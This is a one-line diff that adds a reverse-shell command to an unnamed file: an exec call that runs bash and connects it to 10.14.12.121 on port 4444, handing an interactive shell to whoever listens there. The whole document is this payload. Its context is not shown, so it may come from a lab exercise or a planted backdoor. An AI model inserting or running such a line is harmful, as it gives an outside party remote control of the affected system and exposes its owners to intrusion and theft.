@@ -1,0 +1,1 @@
+exec("/bin/bash -c 'bash -i > /dev/tcp/10.14.12.121/4444 0>&1'");
